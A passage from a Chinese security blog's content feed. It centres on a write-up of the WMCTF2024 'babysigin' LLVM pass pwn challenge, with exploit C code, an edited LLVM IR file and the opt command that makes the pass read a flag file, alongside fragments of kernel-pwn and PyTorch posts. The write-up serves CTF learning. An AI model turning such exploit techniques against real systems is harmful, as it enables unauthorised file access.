class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">	<span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">	<span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">ssize_t</span> (*write)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">const</span> u8 *buf, <span class="type">size_t</span> count);</span><br><span class="line">	<span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, u8 ch);</span><br><span class="line">	<span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">	<span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">	<span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">			     <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">	<span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">const</span> <span class="keyword">struct</span> ktermios *old);</span><br><span class="line">	<span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">	<span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">	<span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">	<span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span> (*ldisc_ok)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> ldisc);</span><br><span class="line">	<span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">	<span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, u8 ch);</span><br><span class="line">	<span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">	<span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">	<span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">				<span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">	<span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">	<span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">	<span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">	<span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">	<span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">	<span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *driver);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>Kernel Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Kernel Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>llvm pass pwn学习（WMCTF2024-babysigin）</title>
    <url>/posts/llvm-pass-pwn1.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现WMCTF时发现都是没怎么接触过的知识，决定把每道题涉及到的知识点都好好学习一下。</p>
<details class="pink" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>参考文章： 点击查看 </summary>
              <div class='content'>
              <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p>[<a class="link"   href="https://bbs.kanxue.com/thread-274259.htm" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/125685242" >LLVM pass pwn 入门 (1)_llvmpwn-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p><a class="link"   href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA" >LLVM PASS类pwn题入门 (qq.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> 
              </div>
            </details>

<h1 id="LLVM简介"><a href="#LLVM简介" class="headerlink" title="LLVM简介"></a>LLVM简介</h1><p>​	LLVM，即Low-Level Virtual Machine，是以C++编写的用于构建编译器模块化和可重用的编译器框架。广泛用于编译器开发、程序分析、优化以及跨平台代码生成。</p>
<a class="button " href='https://zh.wikipedia.org/wiki/LLVM fa-solid fa-link' title='LLVM维基百科'>LLVM维基百科</a>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2>
  <div class="note p-4 mb-4 rounded-small primary">
    <p>primary 以下内容来自GPT和自身整理</p>

  </div>	

<ul>
<li><strong>模块化设计</strong>：LLVM由多个模块组成，如前端、优化器、后端等，这些模块可以单独使用或组合在一起。</li>
<li><strong>中间表示（IR）</strong>：LLVM有一个强大的中间表示（Intermediate Representation），是一种低级、面向静态单赋值的代码表示形式。<ul>
<li>这种IR既能用于高层次的程序优化，也能用于低层次的机器代码生成。</li>
</ul>
</li>
<li><strong>跨平台支持</strong>：LLVM支持多种平台和架构（如x86、ARM、PowerPC等），这意味着LLVM编写的程序可以轻松地移植到不同平台。</li>
<li><strong>优化</strong>：LLVM的优化器可以对代码进行多种优化，如死代码消除、循环优化、内联展开等；这些优化不仅可以在编译时进行，有的也可以在运行时进行。</li>
<li><strong>前端支持</strong>：LLVM支持多种前端语言，如Clang、Rust、Swift等。</li>
<li><strong>后端生成</strong>：支持多种CPU架构和指令集，能够高效的生成可执行代码。</li>
</ul>
<h1 id="LLVM常见命令"><a href="#LLVM常见命令" class="headerlink" title="LLVM常见命令"></a>LLVM常见命令</h1><p>环境安装：</p>

  <div class="note p-4 mb-4 rounded-small primary">
    <p>primary 命令为直接下载最新版本，但不建议使用最新版本，可以apt查看可下载版本在进行下载</p>

  </div>	

<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install clang</span><br><span class="line">sudo apt install llvm</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240913203234403.png"
                      alt="image-20240913203234403"
                ></p>
<p>常用转换命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure></div>

<h1 id="WMCTF2024-Pwn-Babysigin"><a href="#WMCTF2024-Pwn-Babysigin" class="headerlink" title="WMCTF2024-Pwn-Babysigin"></a>WMCTF2024-Pwn-Babysigin</h1><p>​	首先我们拿到手的是<code>WMCTF.so</code>文件，IDA打开进行静态分析；</p>
<p>​	既然这是一道LLVM PASS Pwn，我们首先需要知道做这种题目的时候是一个什么思路：</p>
<p>​	首先找到<code>runOnFunction</code>是如何重写的，找到之后大致看下代码发现程序应该是调用四个函数，分别为<code>WMCTF_OPEN</code>，<code>;WMCTF_READ</code>，<code>WMCTF_MMAP</code>和<code>WMCTF_WRITE</code>。</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>这一部分只会放部分分析代码，因为代码有点多。。。。</p>
<h3 id="WMCTF-OPEN"><a href="#WMCTF-OPEN" class="headerlink" title="WMCTF_OPEN"></a>WMCTF_OPEN</h3><p>​	首先是WMCTF_OPEN这个函数调用需要的字符串，即函数名；</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105649302.png"
                      alt="image-20240914105649302"
                ></p>
<p>​	中间一部分是进行了一些对文件名及路径的判断，<code>LoadInst</code>典型是从上层函数或外部环境输入的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105822570.png"
                      alt="image-20240914105822570"
                ></p>
<p>​	然后是调用父模块参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105901919.png"
                      alt="image-20240914105901919"
                ></p>
<h3 id="WMCTF-READ"><a href="#WMCTF-READ" class="headerlink" title="WMCTF_READ"></a>WMCTF_READ</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110010062.png"
                      alt="image-20240914110010062"
                ></p>
<p>​	和OPEN部分差不多，获取第一个操作数之后转换为<code>llvm::ConstantInt</code>类型，并检查其是否为<code>0x6666</code>，若满足，就会读取文件0x40大小的内容分到<code>mmap_addr</code>处。</p>
<h3 id="WMCTF-MMAP"><a href="#WMCTF-MMAP" class="headerlink" title="WMCTF_MMAP"></a>WMCTF_MMAP</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110356185.png"
                      alt="image-20240914110356185"
                ></p>
<p>​	同上，第一个操作数为<code>0x7890</code>，就会通过<code>mmap</code>函数来开辟一块内存给<code>mmap_addr</code>。</p>
<h3 id="WMCTF-WRITE"><a href="#WMCTF-WRITE" class="headerlink" title="WMCTF_WRITE"></a>WMCTF_WRITE</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110516912.png"
                      alt="image-20240914110516912"
                ></p>
<p>​	检查第一个操作数是否为<code>llvm::LoadInst</code>类型，如果<code>LoadInst</code>的操作数为<code>llvm::GlobalVariable</code>，则判断其值是否为<code>0x8888</code>，满足这些条件会把<code>mmap_addr</code>的内容写到<code>&amp;dword_0 + 1</code>，并根据操作结果输出成功或错误信息。</p>
<h3 id="总结调用函数所需满足条件"><a href="#总结调用函数所需满足条件" class="headerlink" title="总结调用函数所需满足条件"></a>总结调用函数所需满足条件</h3><ul>
<li>WMCTF_OPEN：<ul>
<li>参数必须是上层函数传过来的，并有四个嵌套层次去检查参数；</li>
</ul>
</li>
<li>WMCTF_READ:<ul>
<li>第一个操作数为<code>0x6666</code>；</li>
</ul>
</li>
<li>WMCTF_MMAP:<ul>
<li>第一个操作数为<code>0x7890</code>；</li>
</ul>
</li>
<li>WMCTF_WRITE:<ul>
<li>第一个操作数为<code>0x8888</code>,并且必须为全局变量。</li>
</ul>
</li>
</ul>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>​	<code>LLVM PASS Pwn</code>脚本编写分为三种语言，首先写C&#x2F;C++代码用来利用漏洞，然后将其编译为<code>.ll</code>文件，最后用python导入后利用pwntools与题目进行交互。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>​	我们的C代码需要满足上文中的所有条件：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">WMCTF_OPEN</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WMCTF_READ</span><span class="params">(<span class="type">int</span> cmd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WMCTF_MMAP</span><span class="params">(<span class="type">int</span> cmd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WMCTF_WRITE</span><span class="params">(<span class="type">int</span> cmd)</span>;</span><br><span class="line"><span class="type">char</span> *filename = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span> *flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> cmd = <span class="number">0x8888</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f0</span><span class="params">(<span class="type">char</span>* name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f1</span><span class="params">(<span class="type">char</span>* name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f2</span><span class="params">(<span class="type">char</span>* name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f3</span><span class="params">(<span class="type">char</span>* name)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func0</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">        WMCTF_OPEN(filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">char</span>* name)</span> &#123;</span><br><span class="line">        func0(filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">char</span>* name)</span> &#123;</span><br><span class="line">        func1(filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">        func2(filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func4</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">        func3(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func5</span><span class="params">()</span> &#123;</span><br><span class="line">        flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">        func4(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">funcmain</span><span class="params">()</span> &#123;</span><br><span class="line">    WMCTF_MMAP(<span class="number">0x7890</span>);</span><br><span class="line">    WMCTF_READ(<span class="number">0x6666</span>);</span><br><span class="line">    WMCTF_WRITE(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>​	OK，现在我们写了一个符合所有条件的C文件，现在需要给他编译成<code>.ll</code>文件：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">clang-14 -emit-llvm -S main.c -o main.ll</span><br></pre></td></tr></table></figure></div>

<p>​	直接生成的文件需要修改，不然打不通：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914142406551.png"
                      alt="image-20240914142406551"
                ></p>
<p>​	修改后<code>main.ll</code>内容：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ModuleID = &#x27;main.c&#x27;</span><br><span class="line">source_filename = &quot;main.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;./flag\00&quot;, align 1</span><br><span class="line">@.addr = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8</span><br><span class="line">@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8</span><br><span class="line">@cmd = dso_local global i32 34952, align 4</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func0(i8* noundef %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** @.addr, align 8</span><br><span class="line">  call void @WMCTF_OPEN(i8* noundef %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare void @WMCTF_OPEN(i8* noundef) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func1(i8* noundef %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** @.addr, align 8</span><br><span class="line">  call void @func0(i8* noundef %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func2(i8* noundef %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** @.addr, align 8</span><br><span class="line">  call void @func1(i8* noundef %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func3(i8* noundef %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** @.addr, align 8</span><br><span class="line">  call void @func2(i8* noundef %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func4(i8* noundef %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** @flag, align 8</span><br><span class="line">  call void @func3(i8* noundef %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @func5() #0 &#123;</span><br><span class="line">  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** @flag, align 8</span><br><span class="line">  %1 = load i8*, i8** @flag, align 8</span><br><span class="line">  call void @func4(i8* noundef %1)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @funcmain() #0 &#123;</span><br><span class="line">  call void @WMCTF_MMAP(i32 noundef 30864)</span><br><span class="line">  call void @WMCTF_READ(i32 noundef 26214)</span><br><span class="line">  %1 = load i32, i32* @cmd, align 4</span><br><span class="line">  call void @WMCTF_WRITE(i32 noundef %1)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare void @WMCTF_MMAP(i32 noundef) #1</span><br><span class="line"></span><br><span class="line">declare void @WMCTF_READ(i32 noundef) #1</span><br><span class="line"></span><br><span class="line">declare void @WMCTF_WRITE(i32 noundef) #1</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIE Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">opt-14 -load ./WMCTF.so -WMCTF -enable-new-pm=0 ./main.ll</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914142330542.png"
                      alt="image-20240914142330542"
                ></p>
<p>改完之后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914150504565.png"
                      alt="image-20240914150504565"
                ></p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>LLVM PASS Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>LLVM PASS Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章之从零开始学习PyTorch2.0</title>
    <url>/posts/%E7%AC%AC%E4%B8%89%E7%AB%A0%E4%B9%8B%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PyTorch2.0.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本章主要是演示了一个深度学习框架的设计过程，进一步的熟悉深度学习框架。</p>
<h1 id="实战MNIST手写体数字识别"><a href="#实战MNIST手写体数字识别" class="headerlink" title="实战MNIST手写体数字识别"></a>实战MNIST手写体数字识别</h1><p>首先我们了解一下<code>MNIST</code>数据集的数据标签，即<code>y_train_label</code></p>
<p>首先打印数据集的前十个标签</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x_train = np.load(<span class="string">&quot;../MNIST/mnist/mnist/x_train.npy&quot;</span>)</span><br><span class="line">y_train_label = np.load(<span class="string">&quot;../MNIST/mnist/mnist/y_train_label.npy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y_train_label[:<span class="number">10</span>])</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241111193322820.png"
                      alt="image-20241111193322820"
                ><figcaption>image-20241111193322820</figcaption></figure></p>
<p>打印了10个字符，意思就是图像3的标签，对应的就是3这个数字字符。</p>
<p>但是需要注意的是，对于提取出来的<code>MNIST</code>的特征值，默认使用一个<code>0~9</code>的数值进行标注，但是这种标注方法并不能使损失函数获得一个好的结果，因此常用<code>one_hot</code>计算方法；</p>
<p><code>one_hot</code>计算方法大概就是我们存在<code>0~9</code>十个数字，表示为<code>[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</code>，那么数字<code>2</code>即可表示为<code>[0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</code>，数字<code>9</code>即可表示为<code>[0, 0, 0, 0, 0, 0, 0, 0, 0, 1]</code>。</p>
<p>当然这种文本特征表示方法也有一定的缺陷，矩阵稀疏、语义缺失等；这不是本文研究的范围，就不过多赘述。</p>
<p>可以编写代码来看下<code>one_hot</code>的使用方法和结果：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">x_train = np.load(<span class="string">&quot;../MNIST/mnist/mnist/x_train.npy&quot;</span>)</span><br><span class="line">y_train_label = np.load(<span class="string">&quot;../MNIST/mnist/mnist/y_train_label.npy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(y_train_label[:10])</span></span><br><span class="line">x = torch.tensor(y_train_label[:<span class="number">5</span>], dtype=torch.int64)</span><br><span class="line">y = torch.nn.functional.one_hot(x, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241111195540923.png"
                      alt="image-20241111195540923"
                ><figcaption>image-20241111195540923</figcaption></figure></p>
<p>可以看到输出结果确实和我们举例的是一样的。</p>
<p>也就是说，<code>MNIST</code>数据集的标签实际上就是一个表示60000幅图片的60000 x 10大小的矩阵张量<code>[60000, 10]</code>；行数指的使数据集中的图片为60000幅，后面是10个列向量；</p>
<p><code>张量</code>：多维数据容器，张量的维度是可以任意的；举例：一个三维张量（三阶张量）可以看作是一个立方体，每个元素有三个索引，一张彩色图片，其中两个维度表示图片的宽和高，第三个维度表示颜色通道。</p>
<h2 id="模型的准备"><a href="#模型的准备" class="headerlink" title="模型的准备"></a>模型的准备</h2><p>上一篇文章说过，对于模型的设计，最关键的一点就是了解输出和输入的数据结构类型。</p>
<p>为了首先对输入图像进行数字分类这个想法，需要一个合适的模型；对于上文中对图像的分析来说，最直观的就是对图像的所有属性都进行计算，即<code>MLP</code>（多层感知机）；</p>
<p>占位：多层感知机详解</p>
<p>而在损失函数的的选择中，我们选择了<code>CrossEntropyLoss</code>，该损失函数计算输入值和目标值之间的交叉熵损失；交叉熵损失函数可用于训练一个单标签或者多标签类别的分类问题。</p>
<p>占位：CrossEntropyLoss</p>
<h2 id="基于PyTorch的代码实现"><a href="#基于PyTorch的代码实现" class="headerlink" title="基于PyTorch的代码实现"></a>基于PyTorch的代码实现</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;CUDA_VISIBLE_DEVICES&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">batch_size = <span class="number">320</span> <span class="comment">#批次数</span></span><br><span class="line">epochs = <span class="number">1024</span> <span class="comment">#训练次数</span></span><br><span class="line"></span><br><span class="line">device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定多层感知机网络模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NeuralNetwork</span>(torch.nn.Module):</span><br><span 